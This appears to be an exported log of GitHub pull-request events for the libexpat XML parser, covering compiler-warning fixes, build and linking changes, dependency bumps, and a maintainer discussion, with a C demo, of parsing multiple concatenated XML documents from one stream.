500,IssueComment,2021-06-29 15:59:21,hartwork,fork_close,"`xmltok_impl.c` also has a few more cases, it seems.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/870722893"", ""author_association"": ""MEMBER""}"
500,ReviewApproved,2021-06-29 16:00:40,hartwork,fork_close,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/500#pullrequestreview-695226870""}"
500,Labeled,2021-06-29 16:01:49,hartwork,fork_close,enhancement,
500,Labeled,2021-06-29 16:01:49,hartwork,fork_close,compilation,
500,Assigned,2021-06-29 16:01:55,hartwork,fork_close,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
500,IssueComment,2021-06-30 14:56:10,hartwork,fork_close,@pkasting does your local environment allow running the code like `.github/workflows/*.yml` does? Please let me know if you need help tracing some of the remaining errors to its origin.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/871477468"", ""author_association"": ""MEMBER""}"
500,IssueComment,2021-07-01 02:44:29,pkasting,fork_close,"> @pkasting does your local environment allow running the code like `.github/workflows/*.yml` does? Please let me know if you need help tracing some of the remaining errors to its origin.

I originally developed this in the copy of libexpat embedded in Chromium, so I don't have theability to build standalone and in all the configurations that are tested here.  I'm a bit mystified by the latest errors.  One build shows ""annotations in unreachable code"" in xmlrole.c, which I haven't touched; the other shows clang complaining that some fallthrough cases are unannotated, in code that isn't reachable (or at least, wasn't reached for me locally; maybe it's reachable in some configs and I've misunderstood when).

Certainly if you wanted to try and take this from here and tweak until it worked that'd be a huge help; I'm not sure exactly what to do next.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/871868926"", ""author_association"": ""NONE""}"
500,IssueComment,2021-07-01 18:00:45,hartwork,fork_close,"@pkasting I have had a closer look myself. I found one place where a fallthrough marker needs to be moved (see patch below) but for others, I just cannot reproduce the errors locally even with a close match of the version of clang (I have Clang `11.1.0` and CI has Clang `11.1.0-++20210428103915+1fdec59bffc1-1\~exp1\~20210428204556.164`).

I don't think we should make changes that the CI is blind to, so we should add `-Wimplicit-fallthrough`. I don't see a way to fix the compile errors yet, though. I have a feeling we may not be able to get this into mergable shape, without some new ideas.

If you would like to ""play CI"" locally to experiment more, this would be the failing [`-DEXPAT_DTD=OFF` case](https://github.com/libexpat/libexpat/pull/500/checks?check_run_id=2944087420):
```bash
cd ""$(mktemp -d)""
git clone --depth 1 https://github.com/pkasting/libexpat.git
cd libexpat/
env CC=clang CXX=clang++ LD=clang++ QA_SANITIZER=address CMAKE_ARGS=-DEXPAT_DTD=OFF ./.travis.sh
```

Here's the patch I mentioned above:
```diff
--- a/expat/lib/xmlparse.c
+++ b/expat/lib/xmlparse.c
@@ -4819,8 +4819,8 @@ doProlog(XML_Parser parser, const ENCODING *enc, const char *s, const char *end,
           return XML_ERROR_NO_MEMORY;
         parser->m_declEntity->publicId = NULL;
       }
-#endif /* XML_DTD */
       FALLTHROUGH;
+#endif /* XML_DTD */
     case XML_ROLE_ENTITY_SYSTEM_ID:
       if (dtd->keepProcessing && parser->m_declEntity) {
         parser->m_declEntity->systemId
```","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/872443677"", ""author_association"": ""MEMBER""}"
500,IssueComment,2021-07-06 14:34:09,hartwork,fork_close,@pkasting what do you think?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/874815256"", ""author_association"": ""MEMBER""}"
500,IssueComment,2021-07-06 14:37:40,pkasting,fork_close,"The only real way forward I'd see is to eliminate the macros and use functions (or inline the code) instead.  At that point I think we can get all compilers to agree.  However, such a change is one I'd prefer not to undertake myself, so unless you're really enthusiastic about it, I'd probably just close this PR, and we'll disable the warning on our side :/","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/874818103"", ""author_association"": ""NONE""}"
500,IssueCommentSupplement,2021-07-06 14:46:58,hartwork,fork_close,Inlining the macros seems like a bigger project. I'll take your offer on closing the PR then. Thanks for your understanding and thanks for giving this a try in the first place. :pray: ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/874826033"", ""author_association"": ""MEMBER""}"
500,ClosePR,2021-07-06 14:46:58,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4983739002"", ""commit_url"": null}"
500,UnAssigned,2021-07-06 15:08:51,hartwork,fork_close,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
507,SubmitCommit,2021-07-23 12:26:57,hartwork,unfork_merge,Autotools: Get CMake templates back in sync with ubuntu-20.04,"{""sha"": ""3914c2cb8384444b82df9a706cb8a3e5a04eee49"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-23T12:26:57Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-07-23T12:26:57Z""}}"
507,OpenPR,2021-07-23 12:30:29,hartwork,unfork_merge,,
507,MergePR,2021-07-23 13:35:44,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5061122963"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/9f742632bae28dea97d6c4b77038608e932d05eb""}"
507,DeleteBranch,2021-09-08 14:58:40,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5272928481"", ""commit_url"": null}"
510,Labeled,2021-09-08 16:40:33,hartwork,unfork_merge,bug,
510,Labeled,2021-09-08 16:40:33,hartwork,unfork_merge,compilation,
510,OpenPR,2021-09-08 16:40:33,hartwork,unfork_merge,,
510,CrossReferenced,2021-09-08 16:42:35,hartwork,unfork_merge,"Link error ""Undefined symbol: ._isnanf"" on AIX","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/509"", ""is_pull_request"": false}}"
510,Revise,2021-09-10 13:56:36,hartwork,unfork_merge,autotools-cmake.yml: Add missing full stop,"{""sha"": ""634cc999e0dd43d5c11a4abe9fb5e42241f30473"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-09-10T13:56:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-09-10T13:56:36Z""}}"
510,CrossReferenced,2021-09-11 17:47:05,hartwork,unfork_merge,CI present but inactive?,"{""reference"": {""url"": ""https://api.github.com/repos/tibirna/qgit/issues/88"", ""is_pull_request"": false}}"
510,Revise,2021-09-20 16:27:52,hartwork,unfork_merge,"Autotools|CMake: Link against libm for function ""isnan""

$ git --no-pager grep -lw isnan
lib/xmlparse.c
tests/runtests.c
xmlwf/xmlwf.c","{""sha"": ""0b7a88b35593b15c97b8f12f0e27ddec7e9ab756"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-09-08T15:57:00Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-09-20T16:27:52Z""}}"
510,MergePR,2021-09-20 17:19:02,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5329823192"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/72d7ce953827fe08a56b8ea64092f208be6ffc5b""}"
510,DeleteBranch,2021-09-20 17:21:38,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5329837023"", ""commit_url"": null}"
510,CrossReferenced,2021-09-23 12:41:38,hartwork,unfork_merge,"[2.4.0, 2.4.1] libexpat.so: undefined reference to `__isnanf'","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/511"", ""is_pull_request"": false}}"
510,CrossReferenced,2021-09-29 12:23:22,pablogsal,unfork_merge,bpo-44394: Ensure libexpat is linked against libm,"{""reference"": {""url"": ""https://api.github.com/repos/python/cpython/issues/28617"", ""is_pull_request"": true}}"
514,OpenPR,2021-10-16 13:25:12,corona10,fork_merge,,
514,IssueComment,2021-10-16 13:25:47,corona10,fork_merge,@hartwork Please let me know if this is not what you intended :),"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/944915048"", ""author_association"": ""CONTRIBUTOR""}"
514,ReviewComment,2021-10-16 14:37:15,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/514#pullrequestreview-781363994""}"
514,IssueComment,2021-10-16 14:41:06,hartwork,fork_merge,@corona10 PS: The move of `NDEBUG` in `runtests.c` seems missing. `expat_config.h` cannot have the last word on `NDEBUG` for that file.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/944925347"", ""author_association"": ""MEMBER""}"
514,Revise,2021-10-17 11:45:24,corona10,fork_merge,Reorder the location of including expat_config.h,"{""sha"": ""59734d6e319042d964c6d5038f2b8d5db8b50792"", ""author"": {""name"": ""Dong-hee Na"", ""email"": ""donghee.na@python.org"", ""date"": ""2021-10-16T13:22:51Z""}, ""committer"": {""name"": ""Dong-hee Na"", ""email"": ""donghee.na@python.org"", ""date"": ""2021-10-17T11:45:24Z""}}"
514,IssueComment,2021-10-17 11:45:51,corona10,fork_merge,@hartwork Updated PTAL :),"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/945098819"", ""author_association"": ""CONTRIBUTOR""}"
514,ReviewApproved,2021-10-17 14:12:42,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/514#pullrequestreview-781455076""}"
514,RenameTitle,2021-10-17 14:15:31,hartwork,fork_merge,,"{""rename"": {""from"": ""Reorder the location of including expat_config.h"", ""to"": ""Include expat_config.h as early as possible""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5474299492""}"
514,MergePR,2021-10-17 14:37:22,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5474325113"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/59734d6e319042d964c6d5038f2b8d5db8b50792""}"
514,IssueCommentSupplement,2021-10-17 14:38:02,hartwork,fork_merge,"Merged, thanks for your contribution :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/945136853"", ""author_association"": ""MEMBER""}"
514,Labeled,2021-10-17 14:38:29,hartwork,fork_merge,enhancement,
514,Labeled,2021-10-17 14:38:42,hartwork,fork_merge,compilation,
514,CrossReferenced,2021-12-09 14:25:39,hartwork,fork_merge,Redefinition warning of `HAVE_STDINT_H`,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/521"", ""is_pull_request"": false}}"
515,SubmitCommit,2021-10-18 12:05:03,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/checkout from 2.3.4 to 2.3.5

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.3.4 to 2.3.5.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.3.4...v2.3.5)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""5be9361183ac62ee9376037efc4b29e276c361fb"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2021-10-18T12:05:03Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2021-10-18T12:05:03Z""}}"
515,OpenPR,2021-10-18 12:05:04,dependabot[bot],unfork_merge,,
515,Labeled,2021-10-18 12:05:06,dependabot[bot],unfork_merge,enhancement,
515,MergePR,2021-10-18 12:48:24,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5478134980"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ade2c097748fe411e79af9b42c28d09844928866""}"
515,DeleteBranch,2021-10-18 12:48:33,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5478135780"", ""commit_url"": null}"
517,SubmitCommit,2021-11-08 12:04:47,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/checkout from 2.3.5 to 2.4.0

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.3.5 to 2.4.0.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.3.5...v2.4.0)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""761db909b05f8cde66e069df7750ce25d7d8e6ad"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2021-11-08T12:04:47Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2021-11-08T12:04:47Z""}}"
517,OpenPR,2021-11-08 12:04:48,dependabot[bot],unfork_merge,,
517,Labeled,2021-11-08 12:04:49,dependabot[bot],unfork_merge,enhancement,
517,MergePR,2021-11-08 13:54:41,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5583068476"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/08d29debaee59fc44f470e2392b78820015afcf2""}"
517,DeleteBranch,2021-11-08 13:54:50,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5583069528"", ""commit_url"": null}"
517,CrossReferenced,2022-01-17 21:55:53,hartwork,unfork_merge,Cover Linux build by GitHub Actions,"{""reference"": {""url"": ""https://api.github.com/repos/gkdr/axc/issues/31"", ""is_pull_request"": true}}"
518,SubmitCommit,2021-11-12 20:55:25,sebres,fork_close,"extends xml-parser with bulk parsing facilities, if BulkXMLEnd-handler specified then multiple XML chunks in single stream/data can be parsed in one go","{""sha"": ""94d425fe886ef4e7fa08318d71a12e4c737ba81c"", ""author"": {""name"": ""Sergey G. Brester"", ""email"": ""serg.brester@sebres.de"", ""date"": ""2021-11-12T20:21:08Z""}, ""committer"": {""name"": ""Sergey G. Brester"", ""email"": ""serg.brester@sebres.de"", ""date"": ""2021-11-12T20:55:25Z""}}"
518,SubmitCommit,2021-11-12 20:55:42,sebres,fork_close,avoid to invoke bulk xml-end handler for empty block (e. g. repeated call of XML_ParseBuffer with final=1 invoked at end of file),"{""sha"": ""73ee8818dc9d4bee21156f8c8e26b8f53206af6b"", ""author"": {""name"": ""Sergey G. Brester"", ""email"": ""serg.brester@sebres.de"", ""date"": ""2021-11-12T20:25:49Z""}, ""committer"": {""name"": ""Sergey G. Brester"", ""email"": ""serg.brester@sebres.de"", ""date"": ""2021-11-12T20:55:42Z""}}"
518,OpenPR,2021-11-12 20:56:34,sebres,fork_close,,
518,IssueComment,2021-11-12 21:52:41,hartwork,fork_close,"Hi @sebres, before getting lost in discussing implementation details, it seems healthy to me to step back a bit and discuss on a big picture level what the precise problem is, if added value beats costs, what other places the problem could be solved, and so on: let's separate requirements/problem from implementation/solution, first.
If the eventual outcome will be ""yes, this problem should be addressed inside libexpat"", an implementation will need to be secure, documented, and have enough tests to be releases with confidence.

Questions I would like to ask at the moment:

- What is the precise scenario, and how are the known workarounds — e.g. inserting length headers or ""magic"" start-of-new-document markers (..) before each XML document into the stream or adding a wrapping element a la `<wrapper>[..doc1..][..doc2..]</wrapper>` not good enough for your case?  I have an idea why but I'd rather hear from you, to be sure.
- What other options have you considered other than extending libexpat to make your scenario work?
- What other XML parsers or specs are addressing this (or a similar, say with JSON) problem already and how?
- Why has this problem not come up in the last (near) 25 years of libexpat, how has relevance increased in the mean time?
- Are you ready to invest in taking this feature to secure, tested and documented?

Best, Sebastian

CC @timbray","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/967632358"", ""author_association"": ""MEMBER""}"
518,IssueComment,2021-11-14 15:53:41,sebres,fork_close,"> inserting length headers or ""magic"" start-of-new-document markers (..) before each XML document into the stream or adding a wrapping element

It is not an option, because the streams I needed to parse are hardly modifiable on my side - it is customer data (SWIFT- or SEPA-credit transfers and transactions) received as it is. As for wrapping element - it'll be additionally not really helpful, because it'd quasi generate 1 large XML, instead of hundreds or thousands small XML objects (not to mention that they may have meta tags like `<?xml ...?>` etc)...

> What other options have you considered other than extending libexpat to make your scenario work?

Well, Tcl has reflected channel (e. g. a channel which could modify the stream in place), so one could cover the main stream with such a reflected around modifying the content before supply it to xml-parser. But such an encapsulation is not trivial and would anyway imply the xml-parsing too, so the overhead compared with simple enhancement of libexpat is not justified at all.

Another variant would be to react on `XML_ERROR_JUNK_AFTER_DOC_ELEMENT` and implement the rest outside of libexpat, just it is also more complex as this simple enhancement, especially if one needs to consider the current position in stream in order to continue parsing (or expects to save offset and length of current processed XML) without to recalculate them expensively or do the seeking in the stream.
But it'd be indeed possible if the current position will be stored somewhere in libexpat, so the caller of `XML_ParseBuffer` or `XML_Parse` has a chance to continue processing from that position after `XML_ERROR_JUNK_AFTER_DOC_ELEMENT`.

> What other XML parsers or specs are addressing this (or a similar, say with JSON) problem already and how?

I don't know about the exact specs addressing that. The procedure is called bulk data transfer or stream, and it is simply a multiple datasets (no matter which format XML, JSON, JSON5, whatever) combined to single stream, which only imply that a format of dataset provides a possibility to recognize the end of dataset in place (what XML or JSON format does), so the junk after document element is always the begin of next document.

> Why has this problem not come up in the last (near) 25 years of libexpat

No idea... Probably people using other libraries which would allow to put the bulk-parsing in practice.
But as with many other enhancements something becomes implemented as someone needs it. And because it is now implemented on my side, my intention was to provide the solution for open source community - so if one has to realize same procedure it will be possible with libexpat also.

> Are you ready to invest in taking this feature to secure, tested and documented?

Yes.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/968316716"", ""author_association"": ""NONE""}"
518,IssueComment,2021-11-14 18:02:02,timbray,fork_close,"I’m generally sympathetic to this feature request.  The notion of sending a bunch of XML documents, concatenated, down a wire, feels very reasonable, you don't have to worry about escaping anything or inserting record markers, because XML takes care of that very thoroughly and cleanly.  Maybe if we'd had this, XMPP wouldn't have been so stupid.  

I can think of one corner case - do you allow white space between the XML documents?  

I'll have a look at the PR.

One warning to Sergey - getting code into expat is hard, Sebastian has very VERY high standards.  I'm generally considered quite fussy but Sebastian found lots of real problems with my simple PR (for the -k option).
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/968337650"", ""author_association"": ""CONTRIBUTOR""}"
518,IssueComment,2021-11-14 19:11:09,hartwork,fork_close,"I'd like to note that relying on the XML parser to detect document boundaries has the consequence that if any document is not well-formed, _all following documents_ can no longer be parsed without some manual black magic ""find the start of the next document"" recovery code.

I'd also like to throw in a quick demo of parsing a multi-doc ""stream"" with vanilla libexpat. Please be invited to point out shortcomings with this approach. I'm not making any guarantees here, this is just some idea I wanted to test and see for myself:

```c
// Demo parsing multiple XML documents from the same stream
// Copyright (c) 2021 Sebastian Pipping <sebastian@pipping.org>
// Licensed under the Expat MIT license
//
// Compile and run with:
// # gcc -std=c99 -Wall -Wextra -pedantic -lexpat multidoc.c && ./a.out

#include <stdio.h>
#include <string.h>

#include <expat.h>

static void start(void *data, const char *el, const char **attr) {
  (void)attr;
  printf(""[*][%d]   <%s>\n"", (int)(long)data, el);
}

static void end(void *data, const char *el) {
  printf(""[*][%d]   </%s>\n"", (int)(long)data, el);
}

int main() {
  const char *text = ""<r1/>""
                     ""<r2/>""
                     ""\n""
                     ""<r3/>""
                     ""\n\n""
                     ""<r4/>""
                     ""    ""
                     ""<r5/>"";

  XML_Parser parser = XML_ParserCreate(NULL);

  XML_Index offset = 0;
  int len = (int)strlen(text);
  int docNumber = 1;
  int exitCode = 0;

  for (;; docNumber++) {
    printf(""[*][%d] Parsing from offset %lld\n"", docNumber, (long long)offset);

    XML_SetElementHandler(parser, start, end);
    XML_SetUserData(parser, (void *)(long)docNumber);

    const enum XML_Status status =
        XML_Parse(parser, text + offset, len - offset, 1);
    if (status == XML_STATUS_OK) {
      printf(""[+][%d] Parsing succeeded without junk\n"", docNumber);
      break;
    }

    const enum XML_Error error = XML_GetErrorCode(parser);
    if (error != XML_ERROR_JUNK_AFTER_DOC_ELEMENT) {
      printf(""[-][%d] Parsing failed\n"", docNumber);
      exitCode = 1;
      break;
    }

    printf(""[+][%d] Parsing succeeded with junk\n"", docNumber);

    offset += XML_GetCurrentByteIndex(parser);
    XML_ParserReset(parser, NULL);
  }

  XML_ParserFree(parser);

  return exitCode;
}
```

For the expected output:
```console
# gcc -std=c99 -Wall -Wextra -pedantic -lexpat multidoc.c && ./a.out
[*][1] Parsing from offset 0
[*][1]   <r1>
[*][1]   </r1>
[+][1] Parsing succeeded with junk
[*][2] Parsing from offset 5
[*][2]   <r2>
[*][2]   </r2>
[+][2] Parsing succeeded with junk
[*][3] Parsing from offset 11
[*][3]   <r3>
[*][3]   </r3>
[+][3] Parsing succeeded with junk
[*][4] Parsing from offset 18
[*][4]   <r4>
[*][4]   </r4>
[+][4] Parsing succeeded with junk
[*][5] Parsing from offset 27
[*][5]   <r5>
[*][5]   </r5>
[+][5] Parsing succeeded without junk
```
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/968347177"", ""author_association"": ""MEMBER""}"
518,IssueComment,2021-11-14 19:14:37,timbray,fork_close,"Sebastian, I completely agree, and I would simply fail and exit at the first point of non-well-formedness.  We can think about a ""-k"" equivalent option later.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/968347706"", ""author_association"": ""CONTRIBUTOR""}"
518,IssueComment,2021-11-14 19:58:09,timbray,fork_close,"As to your implementation, it's cool and we'll see if it meets Sergey's use-case. However it relies on some behaviors of expat that are, um, not so strongly documented. For example, that XML_Parse can be relied on to maintain input file state.  Also I didn't know about XML_ParserReset so I bet that lots of other people don't either.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/968353714"", ""author_association"": ""CONTRIBUTOR""}"
518,IssueComment,2021-11-15 15:26:36,sebres,fork_close,"Ok, thanks for an example... I'll try to rewrite tdom-library without to modify libexpat (as I started my attempts, I got an issue with the byte-offsets, but may be it was something on tcl-side what I missed additionally).","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/969022436"", ""author_association"": ""NONE""}"
518,IssueComment,2021-11-15 16:53:32,sebres,fork_close,"Hmm... tried it now and I see many disadvantages to do that all on client side:
- as a reaction on XML_ERROR_JUNK_AFTER_DOC_ELEMENT one need to shift data/len by offset, what means that further parsing will lose a correct position from begin of data (stream), it is some intermediate position from last know XML-end;
- thus if one needs to find out the offsets to begin of stream (e. g. in order to store the chunk offset/length in original stream), one must calculate it on client side relative to some common offset, growing with every chunk.
- in case of some error, the position of error (returned by `XML_GetCurrentLineNumber` and `XML_GetCurrentColumnNumber`) is not correct (they are also some intermediate values relative to last know end of previous XML and not to begin of stream or file);
- it is hardly possible to use `XML_ParseBuffer` (e. g. work over a file with `XML_GetBuffer`), because it does not intended to use shift of buffer at all (`XML_ParseBuffer` has only `len` argument), and because by EOF we need to supply last buffer to `XML_ParseBuffer` with `isFinal = 1`, so one needs to check whether there are no whitespaces at end of data, otherwise one could catch `XML_ERROR_NO_ELEMENTS` (or one'd ignore it in certain circumstances if bulk parsing enabled).

That all makes the approach not so practicable.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/969107566"", ""author_association"": ""NONE""}"
518,Revise,2021-11-15 17:03:24,sebres,fork_close,cleanup - remove 2 todo's (they could be targeted in separate PR/issue),"{""sha"": ""538e4d763f0d3dd85e10296a2c080091dc615afc"", ""author"": {""name"": ""Sergey G. Brester"", ""email"": ""serg.brester@sebres.de"", ""date"": ""2021-11-15T17:03:24Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2021-11-15T17:03:24Z""}}"
518,IssueComment,2021-11-15 18:14:49,timbray,fork_close,"FWIW, the top-level grammar rule in the definition of XML is:

```
document	   ::=   	prolog element Misc*
```

And if you look at `Misc` that includes comments and PIs and white-space.  And if you look at `Prolog`…

```
prolog  ::= XMLDecl? Misc* (doctypedecl Misc*)?
```

Since the XML declaration is optional, an XML doc can in principle also begin with a mixture of PIs, comments, and whitespace. White space can be safely ignored, so if we're going to do this, there has to be a policy decision about PIs and comments between documents in the stream; do they belong to the preceding or following document?





","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/969184847"", ""author_association"": ""CONTRIBUTOR""}"
518,IssueComment,2021-11-15 22:02:35,hartwork,fork_close,"> [..] there has to be a policy decision about PIs and comments between documents in the stream; do they belong to the preceding or following document?

@timbray if the parse continues until junk-after-document that would attribute all those to the preceding document.
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/969363189"", ""author_association"": ""MEMBER""}"
518,IssueComment,2021-11-16 01:05:24,hartwork,fork_close,"> * as a reaction on XML_ERROR_JUNK_AFTER_DOC_ELEMENT one need to shift data/len by offset, what means that further parsing will lose a correct position from begin of data (stream), it is some intermediate position from last know XML-end;
> 
> * thus if one needs to find out the offsets to begin of stream (e. g. in order to store the chunk offset/length in original stream), one must calculate it on client side relative to some common offset, growing with every chunk.
> 
> * in case of some error, the position of error (returned by `XML_GetCurrentLineNumber` and `XML_GetCurrentColumnNumber`) is not correct (they are also some intermediate values relative to last know end of previous XML and not to begin of stream or file);

@sebres line numbers, column numbers and byte offsets relative to the _current document_ (rather than to the stream/collection of documents) seems a feature to me, ~and holds more information. Compare ""line 3 in document 4"" to ""line 456 in the whole stream"". The former can be turned into the latter easily, but not the other way around. Am I missing something?~
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/969572701"", ""author_association"": ""MEMBER""}"
518,IssueComment,2021-11-16 12:55:32,sebres,fork_close,"> Compare ""line 3 in document 4"" to ""line 456 in the whole stream"" ...

Well it is questionable feature, since one parses a bulk-stream... because in that case one'd need to find document 4 in a whole stream/file (so do the ""parse"" again or by yourselves). However it can be indeed considered as a matter of taste (in my case the whole stream is processed in a single transaction, so it is either a part of whole ""document"" which is broken).

> The former can be turned into the latter easily...

Do you mean to save previous numbers returned by `XML_GetCurrentLineNumber` and `XML_GetCurrentColumnNumber` and calculate new whole offsets? Something like that:
```c
do {
  ... 
  int ln = XML_GetCurrentLineNumber();
  if (ln > 1) {
    wholeLN += ln - 1;
    wholeCN = XML_GetCurrentColumnNumber();
  } else {
    wholeCN += XML_GetCurrentColumnNumber();
  }
} while();
```
it looks a bit ugly to me (e. g. error-prone).
And wouldn't this cause many unneeded XmlUpdatePosition invocations or other additional calculations which are acceptable on demand (error case), but not so optimal if called preventively each time?

> ... but not the other way around.

Why so? it can be done exactly the same way, but vice versa (the line and column number of last successful document can be also obtained and saved in last call of BulkXMLEnd handler).","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/970244270"", ""author_association"": ""NONE""}"
518,IssueComment,2021-11-16 15:06:58,hartwork,fork_close,"> > ... but not the other way around.
> 
> Why so? it can be done exactly the same way, but vice versa (the line and column number of last successful document can be also obtained and saved in last call of BulkXMLEnd handler).

@sebres nevermind, I figured that it's bidirectional after writing that last night.


> > The former can be turned into the latter easily...
> 
> Do you mean to save previous numbers returned by `XML_GetCurrentLineNumber` and `XML_GetCurrentColumnNumber` and calculate new whole offsets? Something like that:
> 
> ```c
> do {
>   ... 
>   int ln = XML_GetCurrentLineNumber();
>   if (ln > 1) {
>     wholeLN += ln - 1;
>     wholeCN = XML_GetCurrentColumnNumber();
>   } else {
>     wholeCN += XML_GetCurrentColumnNumber();
>   }
> } while();
> ```
> 
> it looks a bit ugly to me (e. g. error-prone). And wouldn't this cause many unneeded XmlUpdatePosition invocations or other additional calculations which are acceptable on demand (error case), but not so optimal if called preventively each time?
> 

